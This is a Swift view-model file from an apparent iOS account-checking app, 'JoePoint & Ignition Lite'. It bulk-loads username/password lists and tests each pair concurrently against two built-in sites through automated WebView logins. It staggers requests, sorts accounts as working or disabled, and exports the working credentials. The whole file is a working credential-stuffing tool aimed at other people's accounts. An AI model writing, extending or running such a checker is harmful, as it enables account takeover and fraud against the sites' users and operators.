import Foundation
import WebKit

@Observable
final class LoginViewModel {
    static let shared = LoginViewModel()
    static let joe = shared
    static let ignition = shared

    var credentials: [LoginCredential] = []
    var attempts: [LoginAttempt] = []
    var isRunning: Bool = false
    var speedMode: SpeedMode = .normal
    var maxConcurrency: Int = 7
    var debugMode: Bool = false
    var customSites: [CustomSite] = []
    var showBatchResultPopup: Bool = false
    var lastBatchResult: BatchResult?
    var completedCount: Int = 0
    var postPageSettleDelayMs: Int = 2000
    var activeSessions: Int = 0

    private let loginService = SimpleHardcodedLoginService.shared
    private let sessionManager = WebViewSessionManager()
    private let persistence = PersistenceService.shared
    private let logger = DebugLogger.shared
    private let backgroundService = BackgroundTaskService.shared
    private var batchTask: Task<Void, Never>?

    private let pairedSites: [BuiltInSite] = [.joe, .ignition]

    var displayName: String { "JoePoint & Ignition Lite" }

    var workingCredentials: [LoginCredential] {
        credentials.filter { $0.status == .working }
    }

    var tempDisabledCredentials: [LoginCredential] {
        credentials.filter { $0.status == .tempDisabled }
    }

    var permDisabledCredentials: [LoginCredential] {
        credentials.filter { $0.status == .permDisabled }
    }

    var untestedCredentials: [LoginCredential] {
        credentials.filter { $0.status == .untested }
    }

    var totalTested: Int {
        credentials.count - untestedCredentials.count
    }

    var successRate: Double {
        guard totalTested > 0 else { return 0 }
        return Double(workingCredentials.count) / Double(totalTested) * 100
    }

    init() {
        loadState()
    }

    func addCredentials(_ input: String) {
        let parsed = LoginCredential.smartParse(input)
        guard !parsed.isEmpty else { return }

        let existingKeys = Set(credentials.map { "\($0.username.lowercased())|\($0.password)" })
        let newCreds = parsed.filter { credential in
            !existingKeys.contains("\(credential.username.lowercased())|\(credential.password)")
        }

        credentials.append(contentsOf: newCreds)
        persistCredentials()
        logger.log("[Lite] Added \(newCreds.count) credentials (\(parsed.count - newCreds.count) duplicates skipped)", category: .login, level: .info)
    }

    func removeCredential(_ credential: LoginCredential) {
        credentials.removeAll { $0.id == credential.id }
        persistCredentials()
    }

    func clearAllCredentials() {
        credentials.removeAll()
        persistCredentials()
    }

    func reloadCredentials() {
        credentials = persistence.loadCombinedCredentials()
    }

    func startBatch() {
        guard !isRunning else { return }
        let toTest = credentials.filter { $0.status == .untested || $0.status == .unsure }
        guard !toTest.isEmpty else { return }

        isRunning = true
        attempts.removeAll()
        completedCount = 0
        activeSessions = 0
        backgroundService.registerRunner()
        logger.log("[Lite] Starting paired batch: \(toTest.count) credentials, concurrency: \(maxConcurrency) pairs, speed: \(speedMode.rawValue), settle: \(postPageSettleDelayMs)ms", category: .login, level: .info)

        let capturedSpeed = speedMode
        let capturedConcurrency = maxConcurrency
        let capturedSettleDelay = postPageSettleDelayMs

        for credential in toTest {
            let attempt = LoginAttempt(credential: credential, sessionIndex: attempts.count)
            attempts.append(attempt)
        }

        batchTask = Task {
            let semaphore = AsyncSemaphore(limit: capturedConcurrency)
            let staggerDelay = staggerDelayForConcurrency(capturedConcurrency)

            await withTaskGroup(of: Void.self) { group in
                for (index, attempt) in self.attempts.enumerated() {
                    guard self.isRunning else { break }

                    if index > 0 && staggerDelay > 0 {
                        try? await Task.sleep(for: .milliseconds(staggerDelay))
                    }

                    group.addTask {
                        await semaphore.wait()

                        guard self.isRunning else {
                            attempt.status = .cancelled
                            await semaphore.signal()
                            return
                        }

                        await self.executePairedLogin(
                            attempt: attempt,
                            speed: capturedSpeed,
                            settleDelay: capturedSettleDelay
                        )

                        self.completedCount += 1
                        await semaphore.signal()
                    }
                }
            }

            if self.isRunning {
                self.isRunning = false
                self.finalizeBatch()
            }
            self.activeSessions = 0
            self.backgroundService.unregisterRunner()
        }
    }

    func stopBatch() {
        isRunning = false
        batchTask?.cancel()
        batchTask = nil
        sessionManager.destroyAllSessions()

        for attempt in attempts where !attempt.status.isTerminal {
            attempt.status = .cancelled
        }
        logger.log("[Lite] Batch stopped by user", category: .login, level: .warning)
        finalizeBatch()
        activeSessions = 0
        backgroundService.unregisterRunner()
    }

    func runTestBatch(credentials toTest: [LoginCredential], site: BuiltInSite, speed: SpeedMode, concurrency: Int, settleDelay: Int, onComplete: @escaping (Int, Int, Int) -> Void) {
        let capturedSelectors = site.selectors
        let capturedBaseURL = site.baseURL

        backgroundService.registerRunner()

        Task {
            let semaphore = AsyncSemaphore(limit: concurrency)
            var successes = 0
            var failures = 0
            var disabled = 0
            let staggerDelay = staggerDelayForConcurrency(concurrency)

            await withTaskGroup(of: LoginAttemptStatus.self) { group in
                for (index, credential) in toTest.enumerated() {
                    if index > 0 && staggerDelay > 0 {
                        try? await Task.sleep(for: .milliseconds(staggerDelay))
                    }

                    group.addTask {
                        await semaphore.wait()
                        let result = await self.runSingleSiteLogin(
                            credential: credential,
                            selectors: capturedSelectors,
                            baseURL: capturedBaseURL,
                            speed: speed,
                            settleDelay: settleDelay
                        )
                        credential.recordResult(
                            success: result.status == .success,
                            duration: result.duration,
                            error: result.error,
                            detail: "\(site.displayName): \(result.detail ?? result.status.rawValue)"
                        )
                        await semaphore.signal()
                        return result.status
                    }
                }

                for await status in group {
                    switch status {
                    case .success: successes += 1
                    case .tempDisabled, .permDisabled: disabled += 1
                    default: failures += 1
                    }
                }
            }

            self.backgroundService.unregisterRunner()
            onComplete(successes, failures, disabled)
        }
    }

    private func executePairedLogin(attempt: LoginAttempt, speed: SpeedMode, settleDelay: Int) async {
        attempt.status = .running
        attempt.startedAt = Date()
        activeSessions += pairedSites.count

        let credential = attempt.credential
        async let joeResult = runSingleSiteLogin(
            credential: credential,
            selectors: BuiltInSite.joe.selectors,
            baseURL: BuiltInSite.joe.baseURL,
            speed: speed,
            settleDelay: settleDelay
        )
        async let ignitionResult = runSingleSiteLogin(
            credential: credential,
            selectors: BuiltInSite.ignition.selectors,
            baseURL: BuiltInSite.ignition.baseURL,
            speed: speed,
            settleDelay: settleDelay
        )

        let pairedResult = await combineResults(joe: joeResult, ignition: ignitionResult)
        activeSessions = max(0, activeSessions - pairedSites.count)

        attempt.status = pairedResult.status
        attempt.responseSnippet = pairedResult.detail
        attempt.errorMessage = pairedResult.error
        attempt.completedAt = Date()

        credential.recordResult(
            success: pairedResult.status == .success,
            duration: attempt.duration ?? 0,
            error: pairedResult.error,
            detail: pairedResult.detail ?? pairedResult.status.rawValue
        )

        persistCredentials()

        if speed.isDebugMode {
            logger.log("[Lite] [\(credential.username)] → \(attempt.status.rawValue) (\(attempt.formattedDuration))", category: .login, level: attempt.status == .success ? .success : .warning)
        }
    }

    private func runSingleSiteLogin(
        credential: LoginCredential,
        selectors: LoginSiteSelectors,
        baseURL: String,
        speed: SpeedMode,
        settleDelay: Int
    ) async -> SiteLoginOutcome {
        let startedAt = Date()
        let (sessionId, webView) = sessionManager.createSession()

        defer {
            sessionManager.destroySession(sessionId)
        }

        do {
            guard let url = URL(string: baseURL) else {
                return SiteLoginOutcome(status: .failed, detail: nil, error: "Invalid URL", duration: Date().timeIntervalSince(startedAt))
            }

            let request = URLRequest(url: url, timeoutInterval: 45)
            _ = webView.load(request)

            let loaded = await sessionManager.waitForPageLoad(sessionId, timeout: 30)
            if !loaded {
                try await Task.sleep(for: .seconds(5))
            }

            let js = loginService.buildLoginJS(
                email: credential.username,
                password: credential.password,
                selectors: selectors,
                speedMode: speed,
                postPageSettleDelayMs: settleDelay
            )

            let resultString = try await webView.evaluateJavaScript(js) as? String
            let result = loginService.parseResult(resultString)

            return SiteLoginOutcome(
                status: result.status,
                detail: result.detail,
                error: result.error,
                duration: Date().timeIntervalSince(startedAt)
            )
        } catch {
            if Task.isCancelled {
                return SiteLoginOutcome(status: .cancelled, detail: nil, error: nil, duration: Date().timeIntervalSince(startedAt))
            }
            return SiteLoginOutcome(
                status: .failed,
                detail: nil,
                error: error.localizedDescription,
                duration: Date().timeIntervalSince(startedAt)
            )
        }
    }

    private func combineResults(joe: SiteLoginOutcome, ignition: SiteLoginOutcome) -> SiteLoginOutcome {
        let combinedDetail = [
            "Joe: \(joe.detail ?? joe.status.rawValue)",
            "Ignition: \(ignition.detail ?? ignition.status.rawValue)"
        ].joined(separator: " • ")
        let combinedDuration = max(joe.duration, ignition.duration)
        let combinedError = [joe.error, ignition.error].compactMap { $0 }.joined(separator: " | ")

        if joe.status == .permDisabled || ignition.status == .permDisabled {
            return SiteLoginOutcome(status: .permDisabled, detail: combinedDetail, error: combinedError.isEmpty ? nil : combinedError, duration: combinedDuration)
        }

        if joe.status == .tempDisabled || ignition.status == .tempDisabled {
            return SiteLoginOutcome(status: .tempDisabled, detail: combinedDetail, error: combinedError.isEmpty ? nil : combinedError, duration: combinedDuration)
        }

        if joe.status == .success && ignition.status == .success {
            return SiteLoginOutcome(status: .success, detail: combinedDetail, error: nil, duration: combinedDuration)
        }

        if joe.status == .success || ignition.status == .success {
            return SiteLoginOutcome(status: .success, detail: combinedDetail, error: nil, duration: combinedDuration)
        }

        if joe.status == .unsure || ignition.status == .unsure {
            return SiteLoginOutcome(status: .unsure, detail: combinedDetail, error: combinedError.isEmpty ? nil : combinedError, duration: combinedDuration)
        }

        if joe.status == .cancelled || ignition.status == .cancelled {
            return SiteLoginOutcome(status: .cancelled, detail: combinedDetail, error: combinedError.isEmpty ? nil : combinedError, duration: combinedDuration)
        }

        return SiteLoginOutcome(status: .failed, detail: combinedDetail, error: combinedError.isEmpty ? nil : combinedError, duration: combinedDuration)
    }

    private func staggerDelayForConcurrency(_ concurrency: Int) -> Int {
        if concurrency >= 10 { return 500 }
        if concurrency >= 7 { return 300 }
        if concurrency >= 4 { return 150 }
        return 0
    }

    private func finalizeBatch() {
        let successes = attempts.filter { $0.status == .success }.count
        let failures = attempts.filter { $0.status == .failed }.count
        let tempDisabled = attempts.filter { $0.status == .tempDisabled }.count
        let permDisabled = attempts.filter { $0.status == .permDisabled }.count
        let unsure = attempts.filter { $0.status == .unsure }.count

        lastBatchResult = BatchResult(total: attempts.count, successes: successes, failures: failures, tempDisabled: tempDisabled, permDisabled: permDisabled, unsure: unsure)
        showBatchResultPopup = true
        persistCredentials()
        logger.log("[Lite] Batch complete: \(successes)W / \(failures)F / \(tempDisabled)TD / \(permDisabled)PD / \(unsure)U (of \(attempts.count))", category: .login, level: .success)
    }

    func persistSettings() {
        persistence.saveString(speedMode.rawValue, forKey: "login_combined_speed_mode")
        persistence.saveInt(maxConcurrency, forKey: "login_combined_max_concurrency")
        persistence.saveBool(debugMode, forKey: "login_combined_debug_mode")
        persistence.saveInt(postPageSettleDelayMs, forKey: "login_combined_settle_delay")
    }

    func persistCredentials() {
        persistence.saveCombinedCredentials(credentials)
    }

    private func loadState() {
        credentials = persistence.loadCombinedCredentials()
        customSites = persistence.loadCustomSites()

        if let speedRaw = persistence.loadString(forKey: "login_combined_speed_mode"),
           let speed = SpeedMode(rawValue: speedRaw) {
            speedMode = speed
        } else if let speedRaw = persistence.loadString(forKey: "login_\(BuiltInSite.joe.rawValue)_speed_mode"),
                  let speed = SpeedMode(rawValue: speedRaw) {
            speedMode = speed
        }

        let concurrency = persistence.loadInt(forKey: "login_combined_max_concurrency")
        if concurrency > 0 {
            maxConcurrency = concurrency
        } else {
            let legacyConcurrency = persistence.loadInt(forKey: "login_\(BuiltInSite.joe.rawValue)_max_concurrency")
            if legacyConcurrency > 0 {
                maxConcurrency = legacyConcurrency
            }
        }

        debugMode = persistence.loadBool(forKey: "login_combined_debug_mode")
        let settle = persistence.loadInt(forKey: "login_combined_settle_delay")
        if settle > 0 {
            postPageSettleDelayMs = settle
        } else {
            let legacySettle = persistence.loadInt(forKey: "login_\(BuiltInSite.joe.rawValue)_settle_delay")
            if legacySettle > 0 {
                postPageSettleDelayMs = legacySettle
            }
        }
    }

    func handleMemoryPressure() {
        if attempts.count > 200 {
            attempts = Array(attempts.suffix(200))
        }
        sessionManager.handleMemoryPressure()
    }

    func exportWorking() -> String {
        workingCredentials.map(\.exportFormat).joined(separator: "\n")
    }

    func addCustomSite(_ site: CustomSite) {
        customSites.append(site)
        persistence.saveCustomSites(customSites)
    }

    func removeCustomSite(_ site: CustomSite) {
        customSites.removeAll { $0.id == site.id }
        persistence.saveCustomSites(customSites)
    }
}

nonisolated struct BatchResult: Sendable {
    let total: Int
    let successes: Int
    let failures: Int
    let tempDisabled: Int
    let permDisabled: Int
    let unsure: Int

    var summary: String {
        "\(successes) paired working / \(failures) failed / \(tempDisabled) temp-disabled / \(permDisabled) perm-disabled / \(unsure) unsure (of \(total))"
    }
}

nonisolated struct SiteLoginOutcome: Sendable {
    let status: LoginAttemptStatus
    let detail: String?
    let error: String?
    let duration: TimeInterval
}

actor AsyncSemaphore {
    private var count: Int
    private var waiters: [CheckedContinuation<Void, Never>] = []

    init(limit: Int) {
        self.count = limit
    }

    func wait() async {
        if count > 0 {
            count -= 1
        } else {
            await withCheckedContinuation { continuation in
                waiters.append(continuation)
            }
        }
    }

    func signal() {
        if let waiter = waiters.first {
            waiters.removeFirst()
            waiter.resume()
        } else {
            count += 1
        }
    }
}
